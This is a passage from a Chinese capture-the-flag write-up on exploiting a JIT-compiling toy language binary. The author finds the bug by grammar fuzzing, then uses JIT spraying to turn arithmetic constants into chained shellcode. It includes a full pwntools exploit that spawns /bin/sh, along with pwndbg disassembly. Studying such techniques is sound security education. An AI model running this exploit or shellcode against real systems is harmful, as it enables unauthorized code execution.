    run a(1)
如果我们输入不会崩溃的”+”:
    func a(x)
        return x+3
    run a(1)
    pwndbg> x/40i 0x57222000
    => 0x57222000:    cmp    esi,0x57220b3c
       0x57222006:    jl     0x57222015
       0x57222008:    mov    eax,ds:0x5721cb74
       0x5722200d:    mov    esp,DWORD PTR ds:0x5721cb78
       0x57222013:    jmp    eax
       0x57222015:    pop    ebp
       0x57222016:    pop    DWORD PTR [esi+0x0]
       0x57222019:    push   ebp
       0x5722201a:    mov    eax,DWORD PTR [esi+0x0]
       0x5722201d:    add    eax,0x3
       0x57222022:    mov    DWORD PTR [esi+0x4],eax
       0x57222025:    mov    eax,DWORD PTR [esi+0x4]
       0x57222028:    mov    DWORD PTR [esi+0x0],eax
       0x5722202b:    mov    esi,DWORD PTR [esp+0x4]
       0x5722202f:    ret    0x4
       0x57222032:    mov    esi,DWORD PTR [esp+0x4]
       0x57222036:    ret    0x4
       0x57222039:    add    BYTE PTR [eax],al
由于crash的原因在于ecx值太小的问题，尝试修改输入语法观察生成的code的变化后发现当我定义一个var时，ecx就是我们定义的变量大小。因此我们再次修改fuzz时的garmmar增加var的定义。
    ctx.rule("START", "func {Id}({Argu})\n\tvar y={Value}\n\treturn {Expr}\nrun {Id}({X})\n")
    ctx.rule("Id", "a")
    ctx.rule("Argu", "x")
    ctx.rule("Expr", "({Argu} + {E})")
    ctx.rule("Expr", "({Argu} - {E})")
    ctx.rule("Expr", "({Argu} * {E})")
    ctx.rule("Expr", "({Argu} / {E})")
    ctx.rule("Expr", "({Argu} && {E})")
    ctx.rule("Expr", "({Argu} || {E})")
    ctx.rule("E", "({E} - {A})")
    ctx.rule("E", "({E} * {A})")
    ctx.rule("E", "({E} / {A})")
    ctx.rule("E", "({E} && {A})")
    ctx.rule("E", "({E} || {A})")
    ctx.regex("X", "^[0-9]{1,20}$")
    ctx.regex("Value", "^[0-9]{1,20}$")
    ctx.regex("A", "^[0-9]{1,20}$")
    ctx.regex("E", "^[0-9]{1,20}$")
发现了很多的timout
调一下第一个发现生成的code在leave指令前一个指令为jg且跳转地址正是该区域的地址，如果能生成jmp的话说的不定能控制程序流。
    pwndbg> x/30i 0x5799a000
    => 0x5799a000:    cmp    esi,0x57998b3c
       0x5799a006:    jl     0x5799a015
       0x5799a008:    mov    eax,ds:0x57994b74
       0x5799a00d:    mov    esp,DWORD PTR ds:0x57994b78
       0x5799a013:    jmp    eax
       0x5799a015:    pop    ebp
       0x5799a016:    pop    DWORD PTR [esi+0x0]
       0x5799a019:    push   ebp
       0x5799a01a:    mov    ecx,0x7f85fe
       0x5799a01f:    mov    DWORD PTR [esi+0x8],ecx
       0x5799a022:    mov    DWORD PTR [esi+0x4],ecx
       0x5799a025:    mov    eax,DWORD PTR [esi+0x0]
       0x5799a028:    jg     0x5799a05b
       0x5799a02a:    leave  
       0x5799a02b:    test   eax,0x0
       0x5799a030:    je     0x5799a033
       0x5799a032:    inc    ecx
       0x5799a033:    mov    DWORD PTR [esi+0x8],ecx
       0x5799a036:    mov    eax,DWORD PTR [esi+0x8]
       0x5799a039:    mov    DWORD PTR [esi+0x0],eax
       0x5799a03c:    mov    esi,DWORD PTR [esp+0x4]
       0x5799a040:    ret    0x4
       0x5799a043:    mov    esi,DWORD PTR [esp+0x4]
       0x5799a047:    ret    0x4
       0x5799a04a:    add    BYTE PTR [eax],al
       0x5799a04c:    add    BYTE PTR [eax],al
怀疑8357374应该是个对应比较跳转的汇编，利用pwntools disasm：
    >>> disasm("8357374")
    '   0:   38 33                   cmp    BYTE PTR [ebx], dh\n   2:   35 37 33 37 34          xor    eax, 0x34373337'
    >>> u32(asm("jmp ax").ljust(4,'\x00'))
    14745446
所以将var赋值为14745446看到
    pwndbg> x/40i 0x56643000
    => 0x56643000:    cmp    esi,0x56641b3c
       0x56643006:    jl     0x56643015
       0x56643008:    mov    eax,ds:0x5663db74
       0x5664300d:    mov    esp,DWORD PTR ds:0x5663db78
       0x56643013:    jmp    eax
       0x56643015:    pop    ebp
       0x56643016:    pop    DWORD PTR [esi+0x0]
       0x56643019:    push   ebp
       0x5664301a:    mov    ecx,0xe0ff66
       0x5664301f:    mov    DWORD PTR [esi+0x8],ecx
       0x56643022:    mov    DWORD PTR [esi+0x4],ecx
       0x56643025:    mov    eax,DWORD PTR [esi+0x0]
       0x56643028:    loopne 0x5664305b
       0x5664302a:    leave  
       0x5664302b:    test   eax,0x0
       0x56643030:    je     0x56643033
       0x56643032:    inc    ecx
       0x56643033:    mov    DWORD PTR [esi+0x8],ecx
       0x56643036:    mov    eax,DWORD PTR [esi+0x8]
       0x56643039:    mov    DWORD PTR [esi+0x0],eax
       0x5664303c:    mov    esi,DWORD PTR [esp+0x4]
       0x56643040:    ret    0x4
       0x56643043:    mov    esi,DWORD PTR [esp+0x4]
       0x56643047:    ret    0x4
       0x5664304a:    add    BYTE PTR [eax],al
       0x5664304c:    add    BYTE PTR [eax],al
       0x5664304e:    add    BYTE PTR [eax],al
       0x56643050:    add    BYTE PTR [eax],al
       0x56643052:    add    BYTE PTR [eax],al
       0x56643054:    add    BYTE PTR [eax],al
       0x56643056:    add    BYTE PTR [eax],al
       0x56643058:    add    BYTE PTR [eax],al
       0x5664305a:    add    BYTE PTR [eax],al
       0x5664305c:    add    BYTE PTR [eax],al
       0x5664305e:    add    BYTE PTR [eax],al
loopne也是条件跳转但此时的寄存器ecx值大于0且zf为0可以跳转，接下来就是考虑如何在跳转处写入shellcode。  
在增加算数表达式的长度时生成的code也会增加，因此我们可以增加算数表达式的长度并在跳转的对应位置写入shellcode(通过u32(opcode)传入表达式)。  
构造payload如下：
      payload = '''
      func f(v1)
      \tvar v4  = 14745446
      \treturn (((((v1 && 9)+9)+9)-9)+{}+{})
      run f(1)
      '''.format(u32(asm("mov ax,0")))
成功执行到了`mov ax, 0`  
接下来就可以构造完整的shellcode链了，需要注意的是程序为32位，为了保证shellcode不会偏移错位最好使得每条指令长度为2byte（不足的使用’nop’补充），且为了shellcode的连续执行，在每条指令后面跟上一个固定偏移的跳转从而跳到下一条指令执行。
     payload = '''
      func f(v1)
      \tvar v4  = 14745446
      \treturn ((((((v1 && 9)+9)+9)-9)+{})+{})
      run f(1)
      '''.format(u32(asm('mov ah, 0x68')+"\xeb\x07"),u32(asm('mov al, 0x73')+"\xeb\x07"))
      p.sendline(payload)
这样构造就可以将两条指令连接起来。
exp:
    from pwn import *
    # context(arch='i386', os='linux', aslr=False, terminal=['tmux', 'neww'])
    context.log_level = 'debug'
    context.arch = 'i386'
    # context.terminal = ["tmux", "splitw", "-h"]
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p,"b *{}".format(hex(addr)))
    def main(host, port = 1234):
        global p
        if host:
            p = remote(host, port)
        else:
            p = process("./fuzzing-5th")
          # debug(0xA4DE)
          # debug(0xFD75)
        sleep(1)
        shellcode = [
            asm('xor ecx, ecx'),
            asm('xor eax, eax'),
            asm('xor edx, edx'),
            asm('push ecx'),
            asm('mov ah, 0x68'),
            asm('mov al, 0x73'),
            asm('push ax'),
            asm('mov ah, 0x2f'),
            asm('mov al, 0x6e'),
            asm('push ax'),
            asm('mov ah, 0x69'),
            asm('mov al, 0x62'),
            asm('push ax'),
            asm('mov ah, 0x2f'),
            asm('mov al, 0x2f'),
            asm('push ax'),
            asm('mov ebx, esp'),
            asm('xor eax, eax'),
            asm('mov al, 11'),
            asm('int 0x80'),
        ]
        shellcode = [instruction.ljust(2, asm('nop')) for instruction in shellcode]
        shellcode = [instruction + '\xeb\x07' for instruction in shellcode] 
        s = '((((v1 && 9)-9)-9)-9)'
        for instruction in shellcode:
            s = '({} + {})'.format(s, u32(instruction))
        payload = '''
        func f(v1)
        \tvar v4 = {}
        \treturn {}
        run f(1)
        '''.format(14745446, s)    
        #15400960
        # payload = '''
        # func f(v1)
        # \tvar v4  = 14745446
        # \treturn ((((((v1 && 9)+9)+9)-9)+{})+{})
        # run f(1)
        # '''.format(u32(asm('mov ah, 0x68')+"\xeb\x07"),u32(asm('mov al, 0x73')+"\xeb\x07"))
        p.sendline(payload)
        p.interactive()
    if __name__ == "__main__":
        main(0)
## 总结
通过fuzzing触发了程序的漏洞并通过对漏洞的进一步利用完成了程序流的劫持，整个过程下来并没有花费太多的时间在逆向程序的处理逻辑上，最后虽然对于漏洞的成因仍然不是很清楚但仍然pwn掉了，但通过这次的实践也让我体会到了使用fuzzing技术对于漏洞挖掘的重要意义，制定一个行之有效的fuzzing策略将能很大程度上提高我们漏洞挖掘的效率。